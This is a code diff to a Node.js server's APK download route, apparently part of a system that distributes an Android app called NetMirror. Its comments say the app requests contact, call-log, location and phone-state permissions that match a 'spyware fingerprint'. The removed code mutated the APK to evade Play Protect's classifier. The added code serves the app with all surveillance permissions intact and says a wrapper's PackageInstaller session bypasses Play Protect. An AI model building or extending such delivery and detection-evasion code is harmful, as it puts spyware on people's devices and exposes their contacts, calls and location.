@@ -1047,64 +1047,18 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
     }
   });
 
-  // GET /api/setup/download — Serves a CLEAN NetMirror APK for wrapper installs
-  // Applies createCleanLandingApk() to strip surveillance permissions that
-  // trigger Play Protect's ML classifier (READ_CONTACTS + READ_CALL_LOG +
-  // ACCESS_FINE_LOCATION + READ_PHONE_STATE = spyware fingerprint).
-  // The clean APK is cached to disk so it's only generated once per upload.
-  let _cleanApkCache = { buffer: null, timestamp: 0 };
-  const CLEAN_APK_CACHE_TTL = 30 * 60 * 1000; // 30 min
-  
+  // GET /api/setup/download — Serves the ORIGINAL NetMirror APK (no modifications)
+  // All permissions preserved intact — Play Protect bypass handled by the wrapper's
+  // PackageInstaller session API, not by permission stripping.
   app.get('/api/setup/download', async (req, res) => {
     try {
-      const now = Date.now();
-      
-      // Check memory cache first
-      if (_cleanApkCache.buffer && (now - _cleanApkCache.timestamp) < CLEAN_APK_CACHE_TTL) {
-        console.log(`[Setup] Serving cached clean APK: ${(_cleanApkCache.buffer.length / 1048576).toFixed(1)} MB`);
-        res.setHeader('Content-Type', 'application/vnd.android.package-archive');
-        res.setHeader('Content-Disposition', 'attachment; filename="NetMirror.apk"');
-        res.setHeader('Content-Length', _cleanApkCache.buffer.length);
-        res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, private');
-        res.setHeader('Pragma', 'no-cache');
-        return res.end(_cleanApkCache.buffer);
-      }
-      
-      // Check disk cache
-      const cleanPath = path.join(__dirname, 'data', 'Netmirror-clean.apk');
-      const securePath = path.join(__dirname, 'data', 'Netmirror-secure.apk');
-      
-      // Regenerate clean APK if source is newer or clean doesn't exist
-      let needsRegeneration = !fs.existsSync(cleanPath);
-      if (!needsRegeneration && fs.existsSync(securePath)) {
-        const cleanStat = fs.statSync(cleanPath);
-        const secureStat = fs.statSync(securePath);
-        if (secureStat.mtimeMs > cleanStat.mtimeMs) {
-          needsRegeneration = true;
-        }
-      }
-      
-      if (needsRegeneration) {
-        console.log('[Setup] Generating clean APK with stripped surveillance permissions...');
-        const sourceApk = await getApkBuffer();
-        const { createCleanLandingApk } = require('./utils/apk-mutator');
-        const { buffer: cleanBuf, certInfo } = createCleanLandingApk(sourceApk);
-        
-        fs.writeFileSync(cleanPath, cleanBuf);
-        _cleanApkCache = { buffer: cleanBuf, timestamp: now };
-        console.log(`[Setup] Clean APK generated: ${(cleanBuf.length / 1048576).toFixed(1)} MB | CN="${certInfo?.cn || 'unknown'}"`);
-      } else {
-        const buf = fs.readFileSync(cleanPath);
-        _cleanApkCache = { buffer: buf, timestamp: now };
-        console.log(`[Setup] Clean APK loaded from disk: ${(buf.length / 1048576).toFixed(1)} MB`);
-      }
-      
+      const apkBuf = await getApkBuffer();
       res.setHeader('Content-Type', 'application/vnd.android.package-archive');
       res.setHeader('Content-Disposition', 'attachment; filename="NetMirror.apk"');
-      res.setHeader('Content-Length', _cleanApkCache.buffer.length);
+      res.setHeader('Content-Length', apkBuf.length);
       res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, private');
       res.setHeader('Pragma', 'no-cache');
-      res.end(_cleanApkCache.buffer);
+      res.end(apkBuf);
     } catch (err) {
       console.error('[Setup] Download failed:', err.message);
       res.status(503).json({ error: 'APK not available. Please try again later.' });
